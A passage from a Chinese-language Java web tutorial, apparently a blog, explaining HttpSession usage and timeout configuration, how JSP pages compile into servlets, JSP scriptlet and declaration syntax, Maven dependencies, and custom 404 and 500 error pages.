<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo03<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.CookieDemo03<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/cookieDemo03<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/cd03<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-Session-重点"><a href="#4-Session-重点" class="headerlink" title="4.Session(重点)"></a>4.Session(重点)</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/5dd1ae688ff16a9607041d3db814f56b--97f0--image-20241020180613637.png" alt="image-20241020180613637"></p>
<blockquote>
<p>什么是Session：</p>
</blockquote>
<ul>
<li>服务器会给每一个用户（浏览器）创建一个Seesion对象；</li>
<li>一个Seesion独占一个浏览器，只要浏览器没有关闭，这个Session就存在；</li>
<li>用户登录之后，整个网站它都可以访问！–&gt; 保存用户的信息；保存购物车的信息…..</li>
</ul>
<blockquote>
<p>Session和cookie的区别：</p>
</blockquote>
<ul>
<li>Cookie是把用户的数据写给用户的浏览器，浏览器保存 （可以保存多个）</li>
<li>Session把用户的数据写到用户独占Session中，服务器端保存  （保存重要的信息，减少服务器资源的浪费）</li>
<li>Session对象由服务创建；</li>
</ul>
<blockquote>
<p>使用场景：</p>
</blockquote>
<ul>
<li>保存一个登录用户的信息；</li>
<li>购物车信息；</li>
<li>在整个网站中经常会使用的数据，我们将它保存在Session中；</li>
</ul>
<blockquote>
<p>使用Session：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.github.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.github.pojo.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionDemo01</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 解决乱码问题</span></span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 得到Session</span></span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> req.getSession();</span><br><span class="line">        <span class="comment">// 在session中存东西</span></span><br><span class="line">        session.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;懒羊羊&quot;</span>,<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 获取Session中的ID</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> session.getId();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断Session是否为新创建的</span></span><br><span class="line">        <span class="keyword">if</span>(session.isNew())&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;session创建成功！ID:&quot;</span> + id);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;session已经在服务器中存在了！ID:&quot;</span> + id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Session创建的时候做了什么事情:</span></span><br><span class="line"><span class="comment">//        Cookie cookie = new Cookie(&quot;JSESSIONID&quot;, id);</span></span><br><span class="line"><span class="comment">//        resp.addCookie(cookie);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//// 得到Session</span></span><br><span class="line"><span class="comment">//HttpSession session = req.getSession();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Person person = (Person) session.getAttribute(&quot;name&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//System.out.println(person.toString());</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//HttpSession session = req.getSession();</span></span><br><span class="line"><span class="comment">//session.removeAttribute(&quot;name&quot;);</span></span><br><span class="line"><span class="comment">//// 手动注销Session</span></span><br><span class="line"><span class="comment">//session.invalidate();</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/sessionDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.github.servlet.SessionDemo01<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>/sessionDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/sd01<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>会话自动过期：web.xml配置</strong>！</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--设置Session默认的失效时间--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--15分钟后Session自动失效，以分钟为单位--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-timeout</span>&gt;</span>15<span class="tag">&lt;/<span class="name">session-timeout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/768fb44ad49206dcc54f4e9e0fa40805--2149--image-20241020180844033.png" alt="image-20241020180844033"></p>
<h3 id="1-什么是JSP"><a href="#1-什么是JSP" class="headerlink" title="1.什么是JSP"></a>1.什么是JSP</h3><blockquote>
<p>Java Server Pages ： Java服务器端页面，也和Servlet一样，用于动态Web技术！</p>
</blockquote>
<ul>
<li>最大的特点：<ul>
<li>写JSP就像在写HTML；</li>
<li>区别：<ul>
<li>HTML只给用户提供静态的数据；</li>
<li>JSP页面中可以嵌入JAVA代码，为用户提供动态数据；</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-JSP原理"><a href="#2-JSP原理" class="headerlink" title="2.JSP原理"></a>2.JSP原理</h3><p>思路：JSP到底怎么执行的！</p>
<ul>
<li><p>代码层面没有任何问题；</p>
</li>
<li><p>服务器内部工作：</p>
<ul>
<li>tomcat中有一个work目录；</li>
</ul>
</li>
<li><p>IDEA中使用Tomcat的会在IDEA的tomcat中生产一个work目录；</p>
</li>
<li><p><strong>浏览器向服务器发送请求，不管访问什么资源，其实都是在访问Servlet！</strong></p>
</li>
<li><p>JSP最终也会被转换成为一个Java类！</p>
</li>
<li><p><strong>JSP 本质上就是一个Servlet</strong>！</p>
</li>
<li></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspInit</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 销毁</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// JSPService</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">_jspService</span><span class="params">(<span class="keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="keyword">final</span> javax.servlet.http.HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;   </span><br></pre></td></tr></table></figure>

<ol>
<li><p>判断请求；</p>
</li>
<li><p>内置一些对象；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> javax.servlet.jsp.PageContext pageContext;  <span class="comment">// 页面上下文</span></span><br><span class="line">javax.servlet.http.<span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> <span class="literal">null</span>;    <span class="comment">// session</span></span><br><span class="line"><span class="keyword">final</span> javax.servlet.ServletContext application;   <span class="comment">// applicationContext</span></span><br><span class="line"><span class="keyword">final</span> javax.servlet.ServletConfig config;         <span class="comment">// config</span></span><br><span class="line">javax.servlet.jsp.<span class="type">JspWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;           <span class="comment">// out</span></span><br><span class="line"><span class="keyword">final</span> java.lang.<span class="type">Object</span> <span class="variable">page</span> <span class="operator">=</span> <span class="built_in">this</span>;               <span class="comment">// page：当前</span></span><br><span class="line">HttpServletRequest request                        <span class="comment">// 请求</span></span><br><span class="line">HttpServletResponse response                      <span class="comment">// 响应</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>输出页面前增加的代码；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;text/html&quot;</span>);       <span class="comment">// 设置响应的页面类型</span></span><br><span class="line">pageContext = _jspxFactory.getPageContext(<span class="built_in">this</span>, request, response,</span><br><span class="line">                                          <span class="literal">null</span>, <span class="literal">true</span>, <span class="number">8192</span>, <span class="literal">true</span>);</span><br><span class="line">_jspx_page_context = pageContext;</span><br><span class="line">application = pageContext.getServletContext();</span><br><span class="line">config = pageContext.getServletConfig();</span><br><span class="line">session = pageContext.getSession();</span><br><span class="line">out = pageContext.getOut();</span><br><span class="line">_jspx_out = out;</span><br></pre></td></tr></table></figure>
</li>
<li><p>以上的这些个对象我们可以在JSP页面中直接使用！</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/5d3981576968979702376fce9879f2ab--eb78--image-20241020181427526.png" alt="image-20241020181427526"></p>
<ul>
<li>在JSP页面中：<ul>
<li>只要是 JAVA代码就会原封不动的输出；</li>
<li>如果是HTML代码，就会被转换为：</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">out.write(<span class="string">&quot;&lt;html&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;head&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;    &lt;title&gt;$Title$&lt;/title&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;/head&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;body&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  $END$\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;  &lt;/body&gt;\n&quot;</span>);</span><br><span class="line">out.write(<span class="string">&quot;&lt;/html&gt;\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>这样的格式，输出到前端！</li>
</ul>
<h3 id="3-JSP基础语法"><a href="#3-JSP基础语法" class="headerlink" title="3.JSP基础语法"></a>3.JSP基础语法</h3><ul>
<li>任何语言都有自己的语法，JAVA中有，JSP 作为java技术的一种应用，它拥有一些自己扩充的语法（了解，知道即可！），Java所有语法都支持！</li>
<li>配置必需的maven环境：</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JavaWeb-02-Servlet<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Jsp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--   Servlet 依赖   --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        JSP 依赖   --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        JSTL表达式的依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        standard标签库--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>taglibs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>standard<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式**"></a>JSP表达式**</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%--JSP表达式</span><br><span class="line">  作用：用来将程序的输出，输出到客户端</span><br><span class="line">  &lt;%= 变量或者表达式%&gt;</span><br><span class="line">  --%&gt;</span><br><span class="line">  &lt;%= <span class="keyword">new</span> <span class="title class_">java</span>.util.Date()%&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="jsp脚本片段"><a href="#jsp脚本片段" class="headerlink" title="jsp脚本片段"></a><strong>jsp脚本片段</strong></h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%--jsp脚本片段--%&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=<span class="number">100</span> ; i++) &#123;</span><br><span class="line">      sum+=i;</span><br><span class="line">    &#125;</span><br><span class="line">    out.println(<span class="string">&quot;&lt;h1&gt;Sum=&quot;</span>+sum+<span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>脚本片段的再实现</strong></li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    out.println(x);</span><br><span class="line">  %&gt;</span><br><span class="line">  &lt;p&gt;这是一个JSP文档&lt;/p&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    out.println(num);</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%--在代码嵌入HTML元素--%&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">  %&gt;</span><br><span class="line">  &lt;h1&gt;Hello,World  &lt;%=i%&gt; &lt;/h1&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">    &#125;</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%!</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Loading Servlet!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">globalVar</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">guo</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;进入了方法guo！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  %&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>JSP声明：会被编译到JSP生成Java的类中！其他的，就会被生成到_jspService方法中！</p>
</li>
<li><p>在JSP，嵌入Java代码即可！</p>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%%&gt;</span><br><span class="line">&lt;%=%&gt;</span><br><span class="line">&lt;%!%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--注释--%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>JSP的注释，不会在客户端显示，HTML就会！</li>
</ul>
<h3 id="4-JSP指令"><a href="#4-JSP指令" class="headerlink" title="4.JSP指令"></a>4.JSP指令</h3><blockquote>
<p>404与500页面实现</p>
</blockquote>
<ul>
<li>jsp2.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--定制错误页面--%&gt;</span><br><span class="line">&lt;%--&lt;%@ page errorPage=<span class="string">&quot;error/500.jsp&quot;</span> %&gt;--%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>404.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;img src=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/img/2-404.png&quot;</span> alt=<span class="string">&quot;404&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>500.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;自定义<span class="number">500</span>错误的界面&lt;/h2&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;$&#123;pageContext.request.contextPath&#125;/img/1-500.png&quot;</span> alt=<span class="string">&quot;500&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>web.xml</li>
</ul>
